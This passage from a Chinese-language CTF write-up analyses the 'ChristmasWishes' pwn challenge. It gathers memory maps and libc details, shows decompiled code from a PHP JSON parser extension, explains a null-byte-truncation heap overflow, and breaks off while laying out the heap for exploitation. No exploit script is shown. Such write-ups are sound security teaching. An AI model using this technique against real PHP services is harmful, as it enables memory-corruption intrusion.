<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">root@<span class="number">18b</span>7ee65e760:/<span class="meta"># cat /proc/self/maps</span></span><br><span class="line"><span class="number">5580f</span>1ba4000<span class="number">-5580f</span>1ba6000 r--p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">3b</span> <span class="number">525282</span>                     /bin/cat</span><br><span class="line"><span class="number">5580f</span>1ba6000<span class="number">-5580f</span>1bab000 r-xp <span class="number">00002000</span> <span class="number">00</span>:<span class="number">3b</span> <span class="number">525282</span>                     /bin/cat</span><br><span class="line"><span class="number">5580f</span>1bab000<span class="number">-5580f</span>1bae000 r--p <span class="number">00007000</span> <span class="number">00</span>:<span class="number">3b</span> <span class="number">525282</span>                     /bin/cat</span><br><span class="line"><span class="number">5580f</span>1bae000<span class="number">-5580f</span>1baf000 r--p <span class="number">00009000</span> <span class="number">00</span>:<span class="number">3b</span> <span class="number">525282</span>                     /bin/cat</span><br><span class="line"><span class="number">5580f</span>1baf000<span class="number">-5580f</span>1bb0000 rw-p <span class="number">0000</span>a000 <span class="number">00</span>:<span class="number">3b</span> <span class="number">525282</span>                     /bin/cat</span><br><span class="line"><span class="number">5580f</span>20e1000<span class="number">-5580f</span>2102000 rw-p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span>                          [heap]</span><br><span class="line"><span class="number">7f</span>74de8f2000<span class="number">-7f</span>74de914000 rw-p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span> </span><br><span class="line"><span class="number">7f</span>74de914000<span class="number">-7f</span>74de939000 r--p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">3b</span> <span class="number">525618</span>                     /lib/x86_64-linux-gnu/libc<span class="number">-2.31</span>.so</span><br><span class="line"><span class="number">7f</span>74de939000<span class="number">-7f</span>74dea84000 r-xp <span class="number">00025000</span> <span class="number">00</span>:<span class="number">3b</span> <span class="number">525618</span>                     /lib/x86_64-linux-gnu/libc<span class="number">-2.31</span>.so</span><br><span class="line"><span class="number">7f</span>74dea84000<span class="number">-7f</span>74deace000 r--p <span class="number">00170000</span> <span class="number">00</span>:<span class="number">3b</span> <span class="number">525618</span>                     /lib/x86_64-linux-gnu/libc<span class="number">-2.31</span>.so</span><br><span class="line"><span class="number">7f</span>74deace000<span class="number">-7f</span>74deacf000 ---p <span class="number">001b</span>a000 <span class="number">00</span>:<span class="number">3b</span> <span class="number">525618</span>                     /lib/x86_64-linux-gnu/libc<span class="number">-2.31</span>.so</span><br><span class="line"><span class="number">7f</span>74deacf000<span class="number">-7f</span>74dead2000 r--p <span class="number">001b</span>a000 <span class="number">00</span>:<span class="number">3b</span> <span class="number">525618</span>                     /lib/x86_64-linux-gnu/libc<span class="number">-2.31</span>.so</span><br><span class="line"><span class="number">7f</span>74dead2000<span class="number">-7f</span>74dead5000 rw-p <span class="number">001b</span>d000 <span class="number">00</span>:<span class="number">3b</span> <span class="number">525618</span>                     /lib/x86_64-linux-gnu/libc<span class="number">-2.31</span>.so</span><br><span class="line"><span class="number">7f</span>74dead5000<span class="number">-7f</span>74deadb000 rw-p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span> </span><br><span class="line"><span class="number">7f</span>74deade000<span class="number">-7f</span>74deadf000 r--p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">3b</span> <span class="number">525606</span>                     /lib/x86_64-linux-gnu/ld<span class="number">-2.31</span>.so</span><br><span class="line"><span class="number">7f</span>74deadf000<span class="number">-7f</span>74deaff000 r-xp <span class="number">00001000</span> <span class="number">00</span>:<span class="number">3b</span> <span class="number">525606</span>                     /lib/x86_64-linux-gnu/ld<span class="number">-2.31</span>.so</span><br><span class="line"><span class="number">7f</span>74deaff000<span class="number">-7f</span>74deb07000 r--p <span class="number">00021000</span> <span class="number">00</span>:<span class="number">3b</span> <span class="number">525606</span>                     /lib/x86_64-linux-gnu/ld<span class="number">-2.31</span>.so</span><br><span class="line"><span class="number">7f</span>74deb08000<span class="number">-7f</span>74deb09000 r--p <span class="number">00029000</span> <span class="number">00</span>:<span class="number">3b</span> <span class="number">525606</span>                     /lib/x86_64-linux-gnu/ld<span class="number">-2.31</span>.so</span><br><span class="line"><span class="number">7f</span>74deb09000<span class="number">-7f</span>74deb0a000 rw-p <span class="number">0002</span>a000 <span class="number">00</span>:<span class="number">3b</span> <span class="number">525606</span>                     /lib/x86_64-linux-gnu/ld<span class="number">-2.31</span>.so</span><br><span class="line"><span class="number">7f</span>74deb0a000<span class="number">-7f</span>74deb0b000 rw-p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span> </span><br><span class="line"><span class="number">7f</span>fd989a4000<span class="number">-7f</span>fd989c5000 rw-p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span>                          [<span class="built_in">stack</span>]</span><br><span class="line"><span class="number">7f</span>fd989d9000<span class="number">-7f</span>fd989dd000 r--p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span>                          [vvar]</span><br><span class="line"><span class="number">7f</span>fd989dd000<span class="number">-7f</span>fd989df000 r-xp <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span>                          [vdso]</span><br><span class="line">ffffffffff600000-ffffffffff601000 --xp <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span>                  [vsyscall]</span><br></pre></td></tr></table></figure>
<p><strong>信息收集：本地</strong></p>
<p><code>gdb php vmmp</code> 可以也获取本地 libc_base：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">          <span class="number">0x400000</span>           <span class="number">0x401000</span> r--p     <span class="number">1000</span> <span class="number">0</span>      /home/yhellow/桌面/ChristmasWishes/loader</span><br><span class="line">          <span class="number">0x401000</span>           <span class="number">0x402000</span> r-xp     <span class="number">1000</span> <span class="number">1000</span>   /home/yhellow/桌面/ChristmasWishes/loader</span><br><span class="line">          <span class="number">0x402000</span>           <span class="number">0x403000</span> r--p     <span class="number">1000</span> <span class="number">2000</span>   /home/yhellow/桌面/ChristmasWishes/loader</span><br><span class="line">          <span class="number">0x403000</span>           <span class="number">0x404000</span> r--p     <span class="number">1000</span> <span class="number">2000</span>   /home/yhellow/桌面/ChristmasWishes/loader</span><br><span class="line">          <span class="number">0x404000</span>           <span class="number">0x405000</span> rw-p     <span class="number">1000</span> <span class="number">3000</span>   /home/yhellow/桌面/ChristmasWishes/loader</span><br><span class="line">          <span class="number">0x405000</span>           <span class="number">0x426000</span> rw-p    <span class="number">21000</span> <span class="number">0</span>      [heap]</span><br><span class="line">    <span class="number">0x7ffff7db7000</span>     <span class="number">0x7ffff7dba000</span> rw-p     <span class="number">3000</span> <span class="number">0</span>      [anon_7ffff7db7]</span><br><span class="line">    <span class="number">0x7ffff7dba000</span>     <span class="number">0x7ffff7ddc000</span> r--p    <span class="number">22000</span> <span class="number">0</span>      /usr/lib/x86_64-linux-gnu/libc<span class="number">-2.31</span>.so</span><br><span class="line">    <span class="number">0x7ffff7ddc000</span>     <span class="number">0x7ffff7f54000</span> r-xp   <span class="number">178000</span> <span class="number">22000</span>  /usr/lib/x86_64-linux-gnu/libc<span class="number">-2.31</span>.so</span><br><span class="line">    <span class="number">0x7ffff7f54000</span>     <span class="number">0x7ffff7fa2000</span> r--p    <span class="number">4e000</span> <span class="number">19</span>a000 /usr/lib/x86_64-linux-gnu/libc<span class="number">-2.31</span>.so</span><br><span class="line">    <span class="number">0x7ffff7fa2000</span>     <span class="number">0x7ffff7fa6000</span> r--p     <span class="number">4000</span> <span class="number">1e7000</span> /usr/lib/x86_64-linux-gnu/libc<span class="number">-2.31</span>.so</span><br><span class="line">    <span class="number">0x7ffff7fa6000</span>     <span class="number">0x7ffff7fa8000</span> rw-p     <span class="number">2000</span> <span class="number">1</span>eb000 /usr/lib/x86_64-linux-gnu/libc<span class="number">-2.31</span>.so</span><br><span class="line">    <span class="number">0x7ffff7fa8000</span>     <span class="number">0x7ffff7fac000</span> rw-p     <span class="number">4000</span> <span class="number">0</span>      [anon_7ffff7fa8]</span><br><span class="line">    <span class="number">0x7ffff7fac000</span>     <span class="number">0x7ffff7fad000</span> r--p     <span class="number">1000</span> <span class="number">0</span>      /usr/lib/x86_64-linux-gnu/libdl<span class="number">-2.31</span>.so</span><br><span class="line">    <span class="number">0x7ffff7fad000</span>     <span class="number">0x7ffff7faf000</span> r-xp     <span class="number">2000</span> <span class="number">1000</span>   /usr/lib/x86_64-linux-gnu/libdl<span class="number">-2.31</span>.so</span><br><span class="line">    <span class="number">0x7ffff7faf000</span>     <span class="number">0x7ffff7fb0000</span> r--p     <span class="number">1000</span> <span class="number">3000</span>   /usr/lib/x86_64-linux-gnu/libdl<span class="number">-2.31</span>.so</span><br><span class="line">    <span class="number">0x7ffff7fb0000</span>     <span class="number">0x7ffff7fb1000</span> r--p     <span class="number">1000</span> <span class="number">3000</span>   /usr/lib/x86_64-linux-gnu/libdl<span class="number">-2.31</span>.so</span><br><span class="line">    <span class="number">0x7ffff7fb1000</span>     <span class="number">0x7ffff7fb2000</span> rw-p     <span class="number">1000</span> <span class="number">4000</span>   /usr/lib/x86_64-linux-gnu/libdl<span class="number">-2.31</span>.so</span><br><span class="line">    <span class="number">0x7ffff7fb2000</span>     <span class="number">0x7ffff7fb4000</span> rw-p     <span class="number">2000</span> <span class="number">0</span>      [anon_7ffff7fb2]</span><br><span class="line">    <span class="number">0x7ffff7fc2000</span>     <span class="number">0x7ffff7fc4000</span> r--p     <span class="number">2000</span> <span class="number">0</span>      /home/yhellow/桌面/ChristmasWishes/file2ctfer/fpm/jsonparser.so</span><br><span class="line">    <span class="number">0x7ffff7fc4000</span>     <span class="number">0x7ffff7fc6000</span> r-xp     <span class="number">2000</span> <span class="number">2000</span>   /home/yhellow/桌面/ChristmasWishes/file2ctfer/fpm/jsonparser.so</span><br><span class="line">    <span class="number">0x7ffff7fc6000</span>     <span class="number">0x7ffff7fc7000</span> r--p     <span class="number">1000</span> <span class="number">4000</span>   /home/yhellow/桌面/ChristmasWishes/file2ctfer/fpm/jsonparser.so</span><br><span class="line">    <span class="number">0x7ffff7fc7000</span>     <span class="number">0x7ffff7fc8000</span> r--p     <span class="number">1000</span> <span class="number">4000</span>   /home/yhellow/桌面/ChristmasWishes/file2ctfer/fpm/jsonparser.so</span><br><span class="line">    <span class="number">0x7ffff7fc8000</span>     <span class="number">0x7ffff7fc9000</span> rw-p     <span class="number">1000</span> <span class="number">5000</span>   /home/yhellow/桌面/ChristmasWishes/file2ctfer/fpm/jsonparser.so</span><br><span class="line">    <span class="number">0x7ffff7fc9000</span>     <span class="number">0x7ffff7fcd000</span> r--p     <span class="number">4000</span> <span class="number">0</span>      [vvar]</span><br><span class="line">    <span class="number">0x7ffff7fcd000</span>     <span class="number">0x7ffff7fcf000</span> r-xp     <span class="number">2000</span> <span class="number">0</span>      [vdso]</span><br><span class="line">    <span class="number">0x7ffff7fcf000</span>     <span class="number">0x7ffff7fd0000</span> r--p     <span class="number">1000</span> <span class="number">0</span>      /usr/lib/x86_64-linux-gnu/ld<span class="number">-2.31</span>.so</span><br><span class="line">    <span class="number">0x7ffff7fd0000</span>     <span class="number">0x7ffff7ff3000</span> r-xp    <span class="number">23000</span> <span class="number">1000</span>   /usr/lib/x86_64-linux-gnu/ld<span class="number">-2.31</span>.so</span><br><span class="line">    <span class="number">0x7ffff7ff3000</span>     <span class="number">0x7ffff7ffb000</span> r--p     <span class="number">8000</span> <span class="number">24000</span>  /usr/lib/x86_64-linux-gnu/ld<span class="number">-2.31</span>.so</span><br><span class="line">    <span class="number">0x7ffff7ffc000</span>     <span class="number">0x7ffff7ffd000</span> r--p     <span class="number">1000</span> <span class="number">2</span>c000  /usr/lib/x86_64-linux-gnu/ld<span class="number">-2.31</span>.so</span><br><span class="line">    <span class="number">0x7ffff7ffd000</span>     <span class="number">0x7ffff7ffe000</span> rw-p     <span class="number">1000</span> <span class="number">2</span>d000  /usr/lib/x86_64-linux-gnu/ld<span class="number">-2.31</span>.so</span><br><span class="line">    <span class="number">0x7ffff7ffe000</span>     <span class="number">0x7ffff7fff000</span> rw-p     <span class="number">1000</span> <span class="number">0</span>      [anon_7ffff7ffe]</span><br><span class="line">    <span class="number">0x7ffffffde000</span>     <span class="number">0x7ffffffff000</span> rw-p    <span class="number">21000</span> <span class="number">0</span>      [<span class="built_in">stack</span>]</span><br><span class="line"><span class="number">0xffffffffff600000</span> <span class="number">0xffffffffff601000</span> --xp     <span class="number">1000</span> <span class="number">0</span>      [vsyscall]</span><br></pre></td></tr></table></figure>
<p>通过 <code>ldd --version</code> 可以查看 libc 版本：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">➜  ChristmasWishes ldd --<span class="function">version</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">ldd</span> <span class="params">(Ubuntu GLIBC <span class="number">2.31</span><span class="number">-0u</span>buntu9<span class="number">.9</span>)</span> 2.31</span></span><br><span class="line"><span class="function"><span class="title">Copyright</span> <span class="params">(C)</span> 2020 自由软件基金会。</span></span><br><span class="line"><span class="function">这是一个自由软件；请见源代码的授权条款。本软件不含任何没有担保；甚至不保证适销性</span></span><br><span class="line"><span class="function">或者适合某些特殊目的。</span></span><br><span class="line"><span class="function">由 Roland McGrath 和 Ulrich Drepper 编写。</span></span><br></pre></td></tr></table></figure>
<p><strong>漏洞分析</strong></p>
<p>函数 new_Value 就是 jsonparser.so 中处理字符的函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">new_Value</span><span class="params">(__int64 read)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> next; <span class="comment">// [rsp+1Fh] [rbp-1h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)Read_isEnd(read) == <span class="number">1</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  next = Read_next(read);</span><br><span class="line">  <span class="keyword">switch</span> ( next )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;&quot;&#x27;</span>:</span><br><span class="line">      <span class="keyword">return</span> new_String(read); <span class="comment">// String</span></span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;&#123;&#x27;</span>:</span><br><span class="line">      <span class="keyword">return</span> new_Object(read); <span class="comment">// Object</span></span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;[&#x27;</span>:</span><br><span class="line">      <span class="keyword">return</span> new_Array(read); <span class="comment">// Array</span></span><br><span class="line">  &#125;</span><br><span class="line">  --*(_DWORD *)(read + <span class="number">12</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)inNumber((<span class="keyword">unsigned</span> <span class="keyword">int</span>)next) ) <span class="comment">// Integer</span></span><br><span class="line">    <span class="keyword">return</span> new_Number(read);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)isFalse(read) ) <span class="comment">// Boolean</span></span><br><span class="line">    <span class="keyword">return</span> new_False();</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)isTure(read) ) <span class="comment">// Boolean</span></span><br><span class="line">    <span class="keyword">return</span> new_True();</span><br><span class="line">  <span class="keyword">if</span> ( !(<span class="keyword">unsigned</span> __int8)isNull(read) ) <span class="comment">// NULL</span></span><br><span class="line">    error_read(read, <span class="string">&quot;parse value&quot;</span>); </span><br><span class="line">  <span class="keyword">return</span> new_Null();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Switch-case 和 if 的处理，刚好对应了 PHP 的几种数据类型：</p>
<ul>
<li>String（字符串）</li>
<li>Integer（整型）</li>
<li>Float（浮点型）</li>
<li>Boolean（布尔型）</li>
<li>Array（数组）</li>
<li>Object（对象）</li>
<li>NULL（空值）</li>
<li>Resource（资源类型）</li>
</ul>
<p>漏洞点就在 <code>new_String-&gt;parser_string</code> 中：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_BYTE *__fastcall <span class="title">parser_string</span><span class="params">(__int64 read)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  _BYTE *chunk_s1; <span class="comment">// rax</span></span><br><span class="line">  _BYTE *chunk_s2; <span class="comment">// rax</span></span><br><span class="line">  _BYTE *chunk_s3; <span class="comment">// rax</span></span><br><span class="line">  _BYTE *chunk_s4; <span class="comment">// rax</span></span><br><span class="line">  _BYTE *chunk_s5; <span class="comment">// rax</span></span><br><span class="line">  _BYTE *chunk_s6; <span class="comment">// rax</span></span><br><span class="line">  _BYTE *chunk_s7; <span class="comment">// rax</span></span><br><span class="line">  _BYTE *read_ptr_temp2; <span class="comment">// rdx</span></span><br><span class="line">  _BYTE *chunk_s8; <span class="comment">// rax</span></span><br><span class="line">  _BYTE *read_ptr; <span class="comment">// [rsp+20h] [rbp-20h]</span></span><br><span class="line">  _BYTE *read_ptr2; <span class="comment">// [rsp+20h] [rbp-20h]</span></span><br><span class="line">  _BYTE *read_ptr_temp; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line">  _BYTE *ret_s; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  _BYTE *ret; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  read_ptr = (_BYTE *)(*(_QWORD *)read + *(<span class="keyword">int</span> *)(read + <span class="number">12</span>));</span><br><span class="line">  <span class="keyword">for</span> ( read_ptr_temp = read_ptr; *read_ptr_temp != <span class="string">&#x27;&quot;&#x27;</span> &amp;&amp; *read_ptr_temp; ++read_ptr_temp )</span><br><span class="line">    ;                                           <span class="comment">// 遍历read,直到read_ptr_temp指向&#x27;&quot;&#x27;或者NULL</span></span><br><span class="line">  ret_s = <span class="built_in">malloc</span>((<span class="keyword">int</span>)read_ptr_temp - (<span class="keyword">int</span>)read_ptr + <span class="number">1</span>);<span class="comment">// 计算read的长度,分配内存</span></span><br><span class="line">  ret = ret_s;</span><br><span class="line">  <span class="keyword">while</span> ( *read_ptr != <span class="string">&#x27;&quot;&#x27;</span> &amp;&amp; *read_ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *read_ptr != <span class="string">&#x27;\\&#x27;</span> )</span><br><span class="line">      <span class="keyword">goto</span> <span class="keyword">break</span>;</span><br><span class="line">    v1 = (<span class="keyword">char</span>)*++read_ptr;</span><br><span class="line">    <span class="keyword">if</span> ( v1 == <span class="string">&#x27;&quot;&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      chunk_s1 = ret_s++;</span><br><span class="line">      *chunk_s1 = <span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line">      <span class="keyword">goto</span> <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v1 &lt; <span class="string">&#x27;&quot;&#x27;</span> || v1 &gt; <span class="string">&#x27;u&#x27;</span> || v1 &lt; <span class="string">&#x27;\\&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">key:</span><br><span class="line">      ++read_ptr;                               <span class="comment">// 普通字符直接复制进ret_s</span></span><br><span class="line"><span class="keyword">break</span>:</span><br><span class="line">      read_ptr_temp2 = read_ptr++;</span><br><span class="line">      chunk_s8 = ret_s++;</span><br><span class="line">      *chunk_s8 = *read_ptr_temp2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">switch</span> ( *read_ptr )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;\\&#x27;</span>:</span><br><span class="line">          chunk_s2 = ret_s++;</span><br><span class="line">          *chunk_s2 = <span class="string">&#x27;\\&#x27;</span>;</span><br><span class="line">          <span class="keyword">goto</span> <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;b&#x27;</span>:</span><br><span class="line">          chunk_s3 = ret_s++;</span><br><span class="line">          *chunk_s3 = <span class="string">&#x27;\b&#x27;</span>;</span><br><span class="line">          <span class="keyword">goto</span> <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;f&#x27;</span>:</span><br><span class="line">          chunk_s4 = ret_s++;</span><br><span class="line">          *chunk_s4 = <span class="string">&#x27;\f&#x27;</span>;</span><br><span class="line">          <span class="keyword">goto</span> <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;n&#x27;</span>:</span><br><span class="line">          chunk_s5 = ret_s++;</span><br><span class="line">          *chunk_s5 = <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">          <span class="keyword">goto</span> <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;r&#x27;</span>:</span><br><span class="line">          chunk_s6 = ret_s++;</span><br><span class="line">          *chunk_s6 = <span class="string">&#x27;\r&#x27;</span>;</span><br><span class="line">          <span class="keyword">goto</span> <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;t&#x27;</span>:</span><br><span class="line">          chunk_s7 = ret_s++;</span><br><span class="line">          *chunk_s7 = <span class="string">&#x27;\t&#x27;</span>;</span><br><span class="line">          <span class="keyword">goto</span> <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;u&#x27;</span>:                              </span><br><span class="line">          read_ptr2 = read_ptr + <span class="number">1</span>;</span><br><span class="line">          hex_parse(ret_s, read_ptr2);</span><br><span class="line">          ret_s += <span class="number">2</span>;</span><br><span class="line">          read_ptr = read_ptr2 + <span class="number">4</span>;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">          <span class="keyword">goto</span> key;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  *ret_s = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)(read + <span class="number">12</span>) = (_DWORD)read_ptr - *(_QWORD *)read + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>这里我先吐槽一下 IDA 的反编译，IDA 总喜欢把 break 弄成 goto 看着很刺眼，IDA 还会搞一堆莫名其妙的变量（其实都是同一个东西），本人逆向很菜鸡，暂时不知道怎么改</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( read_ptr_temp = read_ptr; *read_ptr_temp != <span class="string">&#x27;&quot;&#x27;</span> &amp;&amp; *read_ptr_temp; ++read_ptr_temp )</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ret_s = <span class="built_in">malloc</span>((<span class="keyword">int</span>)read_ptr_temp - (<span class="keyword">int</span>)read_ptr + <span class="number">1</span>);</span><br></pre></td></tr></table></figure>
<ul>
<li>按照程序的逻辑：malloc 申请的大小由 read_ptr_temp 和 read_ptr 确定，但是 read_ptr_temp 的遍历可以被 \x00 截断</li>
<li>这就导致了：malloc 申请的大小 &lt; 实际写入的大小，造成堆溢出</li>
</ul>
<p><strong>入侵思路</strong></p>
<p>有一个堆溢出，那么最好覆盖一个结构体</p>
<p>经过多次调试，得到如下堆布局：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">json = </span><br><span class="line">&#123;&#123;</span><br><span class="line">    <span class="string">&quot;1&quot;</span>: <span class="string">&quot;aaaaaaa&quot;</span>, </span><br><span class="line">    <span class="string">&quot;2&quot;</span>: <span class="string">&quot;aaaaaaa&quot;</span>, </span><br><span class="line">    <span class="string">&quot;3&quot;</span>: <span class="string">&quot;aaaaaaa&quot;</span>, </span><br><span class="line">&#125;&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x405f30</span> <span class="comment">/* info struct */</span></span><br><span class="line">Size: <span class="number">0x51</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x405f80</span> <span class="comment">/* name */</span></span><br><span class="line">Size: <span class="number">0x21</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | 